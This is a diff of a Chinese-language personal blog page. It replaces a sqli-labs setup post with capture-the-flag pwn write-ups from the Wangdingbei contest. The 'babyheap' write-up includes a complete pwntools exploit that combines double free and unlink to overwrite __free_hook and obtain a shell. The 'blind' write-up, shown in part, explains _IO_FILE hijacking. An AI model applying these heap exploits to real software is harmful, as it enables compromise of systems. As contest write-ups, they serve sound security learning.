@@ -252,7 +252,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/23/sqli-labs搭建/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/wangdingbei/网鼎杯pwn-babyheap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="e3pem">
@@ -271,7 +271,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/01/23/sqli-labs搭建/" itemprop="url">sqli-labs环境搭建</a></h1>
+                <a class="post-title-link" href="/2018/09/30/wangdingbei/网鼎杯pwn-babyheap/" itemprop="url">网鼎杯-babyheap</a></h1>
         
 
         <div class="post-meta">
@@ -283,8 +283,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-23T20:12:23+08:00">
-                2018-01-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:43:08+08:00">
+                2018-09-30
               </time>
             
 
@@ -306,8 +306,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -345,41 +345,517 @@
       
         
           
-            <p>最近想学一学web方面的基本知识，先从SQL注入学起。sqli-labs以闯关的方式来介绍了SQL注入的许多技巧。在闯关之前需要先搭建sqli-labs环境，这里搭建环境时主要参考了<a href="https://www.jianshu.com/p/091f5dfa408d" target="_blank" rel="noopener">这条链接</a>。</p>
-<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="无法安装php5"><a href="#无法安装php5" class="headerlink" title="无法安装php5"></a>无法安装php5</h2><ol>
-<li><p>sqli-labs中使用的是php5，在连接数据库时使用的是mysql_connect函数，这些函数在php7中已经废弃了。同时，在Ubuntu 16.04中，安装php时默认的都是php7，安装php5时会提示找不到源的错误。这里解决的方式为：</p>
-<pre><code>sudo add-apt-repository ppa:ondrej/php    
-sudo apt-get update
-sudo apt-get install php5.6
-</code></pre></li>
-</ol>
-<h2 id="连接数据库失败"><a href="#连接数据库失败" class="headerlink" title="连接数据库失败"></a>连接数据库失败</h2><ol>
-<li><p>进行上述安装之后在配置数据库时仍然有问题，仍旧卡死在这个界面：</p>
-<p> <img src="http://oslgqkd4w.bkt.clouddn.com/18-1-24/73056999.jpg" alt=""></p>
-</li>
-</ol>
-<ol>
-<li><p>看到参考链接里面说了需要先测试数据库是否能正常连接，于是使用提供的脚本：</p>
-<pre><code>&lt;?php
-$con = mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;123456&quot;) or die(mysql_error())
-echo &quot;hello&quot;;
-if ($con) {
-        echo &quot;OK!&quot;;
-}else {
-       echo &quot;error&quot;.mysqli_error();
-}
-?&gt;
-</code></pre><p>测试后发现hello根本就没有输出，而且也没有显示出来<code>mysql_error()</code>的值。也就是<code>mysql_connect()</code>函数根本就没有被执行。</p>
-</li>
-<li><p>后来查看Apache的日志文件发现如下错误：</p>
-<p> <img src="http://oslgqkd4w.bkt.clouddn.com/18-1-24/84521235.jpg" alt=""><br>函数根本就没有定义，发现问题后搜索一下就知道是因为mysql安装的不完整。</p>
-</li>
-<li><p>安装mysql</p>
-<pre><code>sudo apt-get install mysql-client
-sudo apt-get install php5.6-mysql
-</code></pre></li>
-</ol>
-<h1 id="成功搭建sqli-labs"><a href="#成功搭建sqli-labs" class="headerlink" title="成功搭建sqli-labs"></a>成功搭建sqli-labs</h1><p>访问配置界面，成功创建数据库：<br>    <img src="http://oslgqkd4w.bkt.clouddn.com/18-1-24/779589.jpg" alt=""></p>
+            <h1 id="网鼎杯pwn-babyheap"><a href="#网鼎杯pwn-babyheap" class="headerlink" title="网鼎杯pwn-babyheap"></a>网鼎杯pwn-babyheap</h1><p>题目链接如下：</p>
+<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序提供了下面几种功能：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-8-21/52659635.jpg" alt=""></p>
+<ul>
+<li>alloc：</li>
+</ul>
+<p>程序在分配堆时，对分配的数量进行了限制，分配的数量最多为10个。且分配的堆大小为0x20字节，并将得到的指针保存到了bss段上。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">9</span> &amp;&amp; !*(_QWORD *)&amp;ptr[<span class="number">8</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;ptr[<span class="number">8</span> * v1] = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">    get_input(*(_QWORD *)&amp;ptr[<span class="number">8</span> * v1], <span class="number">0x20</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>edit：</li>
+</ul>
+<p>edit对指定下标的堆块进行编辑，但是对编辑的次数进行了限制，最多只能编辑三次，用0x6020b0处的值来计数。</p>
+<ul>
+<li>show：</li>
+</ul>
+<p>显示指定下标处对应的堆块的内容。</p>
+<ul>
+<li>free：</li>
+</ul>
+<p>将指定下标对应的堆块free掉，但是free掉之后未将对应处的值设置为NULL</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">free_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">9</span> &amp;&amp; *(_QWORD *)&amp;ptr[<span class="number">8</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)&amp;ptr[<span class="number">8</span> * v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>程序在free后为将指针设置为NULL，导致释放后仍可以往chunk中写入数据</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>程序开启了NX、FULL RELRO以及canary<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap </span><br><span class="line">[*] &apos;/home/ym/Desktop/ctf/wdb/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>所以不能通过修改got表来控制程序流程。同时分配的chunk的大小是不可控的（chunk大小为0x30），而且程序对分配的次数、对chunk编辑的次数都进行了限制。</p>
+<p>利用fastbin attack，首先想到的是double free，利用double free可以分配指定地方的内存，但是需要绕过对chunk size字段的检测，这里在bss段上没有我们能控制的内容。</p>
+<p>往bss段上写数据可以采用unlink，unlink只需要我们能够伪造chunk就行。但是这里又有一个问题，为了触发unlink，被free的chunk大小不能在fastbin范围内，而分配的chunk大小全为0x30.</p>
+<p>这里将double free和unlink结合起来，利用double free在堆上分配一块虚假的chunk，并编辑该chunk，再利用unlink往bss段上写入数据，往bss段上写数据后就能做到任意地址写入，这样通过将控制编辑chunk次数的字段设置为0就能绕过写入次数的限制了，利用任意地址写入往_free_hook中写入system的地址或是one_gadget即可拿到shell。</p>
+<p>在进行double free时需要控制size字段，分配的堆块内容是可控的，只需要知道堆块的地址就可以利用double free，而根据fastbin机制，在free后会在fd字段存储下一个fastbin chunk的地址，这样通过show函数就可以泄露堆的地址了。</p>
+<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.67.115'</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">	<span class="keyword">if</span>(len(content)&lt;<span class="number">0x20</span>):</span><br><span class="line">		p.sendline(content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.send(content)	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任意地址写入的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(target,value)</span>:</span></span><br><span class="line">	edit(<span class="number">5</span>,p64(<span class="number">0</span>))</span><br><span class="line">	edit(<span class="number">7</span>,p64(target)+p64(<span class="number">0x6020b0</span>))</span><br><span class="line">	edit(<span class="number">5</span>,p64(<span class="number">0</span>))</span><br><span class="line">	edit(<span class="number">4</span>,value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) <span class="comment">#fake prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>) <span class="comment">#fake chunk size</span></span><br><span class="line">alloc(<span class="number">0</span>,payload) <span class="comment">#chunk 0</span></span><br><span class="line">alloc(<span class="number">1</span>,payload) <span class="comment">#chunk 1</span></span><br><span class="line">alloc(<span class="number">2</span>,p64(<span class="number">0x30</span>)) <span class="comment">#chunk 2</span></span><br><span class="line">alloc(<span class="number">3</span>,<span class="string">'/bin/sh\x00'</span>) <span class="comment">#chunk 3***</span></span><br><span class="line">alloc(<span class="number">4</span>,<span class="string">'cccc'</span>) <span class="comment">#chunk 4</span></span><br><span class="line">alloc(<span class="number">5</span>,<span class="string">'dddd'</span>) <span class="comment">#chunk 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free : free阶段</span></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># info leak , leak heap addr</span></span><br><span class="line"><span class="comment"># chunk0-&gt;fd = chunk1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">chunk1_addr = u64(p.recvuntil(<span class="string">'Done!'</span>)[:<span class="number">-6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'chunk1 addr is:'</span>+hex(chunk1_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free : malloc阶段</span></span><br><span class="line"><span class="comment"># use double free to malloc a fake chunk (chunk 0's data)</span></span><br><span class="line">alloc(<span class="number">6</span>,<span class="string">'aaaa'</span>) <span class="comment">#chunk 0</span></span><br><span class="line">alloc(<span class="number">7</span>,<span class="string">'cccc'</span>) <span class="comment">#chunk 1</span></span><br><span class="line"><span class="comment"># 将chunk0的fd指向chunk1的数据域，该数据域将用来伪造chunk，虚假chunk的size已被设置为0x31</span></span><br><span class="line">payload = p64(chunk1_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">6</span>,payload) <span class="comment">#first edit</span></span><br><span class="line">alloc(<span class="number">8</span>,<span class="string">'ddddd'</span>) <span class="comment">#chunk 0</span></span><br><span class="line">target_addr = <span class="number">0x602098</span> <span class="comment"># ptr[7]--&gt;chunk 1</span></span><br><span class="line">fake_fd = target_addr<span class="number">-0x18</span></span><br><span class="line">fake_bk = target_addr<span class="number">-0x10</span></span><br><span class="line"><span class="comment"># 虚假chunk的值，fake_fd、fake_bk的值用来unlink</span></span><br><span class="line"><span class="comment"># 将chunk2的prev_size设置为0x20，size设置为0x90&gt;max_fast_bin</span></span><br><span class="line">payload = p64(fake_fd)+p64(fake_bk)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">alloc(<span class="number">9</span>,payload) <span class="comment">#fake chunk,size=0x30</span></span><br><span class="line"><span class="comment"># trigger unlink</span></span><br><span class="line">release(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 往ptr[7]中写入数据即往bss段上写入数据，ptr[4]-&gt;elf.got['puts']，ptr[5]-&gt;编辑的次数</span></span><br><span class="line">payload = p64(elf.got[<span class="string">'puts'</span>]) + p64(<span class="number">0x6020b0</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload) <span class="comment">#second edit</span></span><br><span class="line"><span class="comment"># gadget = 0x45216 #condition:rax=0</span></span><br><span class="line">gadget = <span class="number">0x4526a</span> <span class="comment">#condition:rsp+0x30=NULL</span></span><br><span class="line"><span class="comment"># info leak: leak libc base addr</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'Done!'</span>)[:<span class="number">-6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts addr:'</span>+hex(puts_addr)</span><br><span class="line">base_adrr = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'base addr:'</span>+hex(base_adrr)</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]+base_adrr</span><br><span class="line"><span class="keyword">print</span> <span class="string">'free hook addr:'</span>+hex(free_hook)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+base_adrr</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system addr:'</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将free hook覆盖为system地址</span></span><br><span class="line"><span class="comment"># write(free_hook,p64(system_addr))</span></span><br><span class="line"><span class="comment"># # trigger free to run system</span></span><br><span class="line"><span class="comment"># release(3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将free hook覆盖为one gadget地址</span></span><br><span class="line">write(free_hook,p64(base_adrr+gadget))</span><br><span class="line">release(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/wangdingbei/网鼎杯pwn-blind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/30/wangdingbei/网鼎杯pwn-blind/" itemprop="url">网鼎杯-blind</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:38:20+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="网鼎杯pwn-blind"><a href="#网鼎杯pwn-blind" class="headerlink" title="网鼎杯pwn-blind"></a>网鼎杯pwn-blind</h1><p>题目下载链接：</p>
+<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序提供了下面几种功能：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_choice</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.new"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.change"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.release"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Choice:"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>new：创建一个堆块，大小为0x68，程序对创建堆块的数量进行了限制，最多只能创建5个。</li>
+<li>change：对分配的堆块进行编辑。</li>
+<li>release：释放分配的堆块，在释放后没有将对应的指针设置为NULL，存在UAF漏洞。</li>
+</ul>
+<p>查看程序开启了哪些保护措施：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到开启了canary、full relro、nx保护措施。</p>
+<h2 id="利用思路——劫持FILE结构体"><a href="#利用思路——劫持FILE结构体" class="headerlink" title="利用思路——劫持FILE结构体"></a>利用思路——劫持FILE结构体</h2><p>利用<code>fastbin attack</code>可以实现分配一个虚假的chunk在bss段上，进而控制bss段上的数据，实现任意地址写入。再有了任意地址写入的能力后，关键是如何控制程序的流程，程序里面没有输出函数，不存在信息泄露，got表不可写，无法通过修改got表来控制程序流程。</p>
+<p>这里采用劫持<code>_IO_FILE</code>的方式来控制程序流程，程序中<code>stdin</code>、<code>stdout</code>、<code>stderror</code>结构体的指针均存放在bss段上，由于可以做到任意地址写入，把这里的stdout指针指向我们伪造的<code>_IO_FILE</code>结构体，并将其中的函数表中的值指向0x4008e3处（这里会执行system(‘/bin/sh’)）</p>
+<p>往bss段上分配虚假的chunk，需要满足对chunk中size域的校验，程序分配的chunk大小均为0x70，而在bss段上恰好可以通过偏移的方式来满足这个条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /100xb 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:	0x20	0xb6	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602030 &lt;stdin&gt;:	0xe0	0xa8	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x40	0xb5	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602050:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602058:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br></pre></td></tr></table></figure></p>
+<p>如果chunk是从0x602025-0x8=0x60201d、0x602035-0x8=0x60202d、0x602045-0x8=0x60203d处开始，那么这样的chunk刚好可以满足条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10xg 0x60203d</span><br><span class="line">0x60203d:	0x17450cb540000000	0x000000000000007f</span><br><span class="line">0x60204d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x60205d:	0x0000602200000000	0x000062c000000000</span><br><span class="line">0x60206d:	0x000062c010000000	0x000062c080000000</span><br></pre></td></tr></table></figure></p>
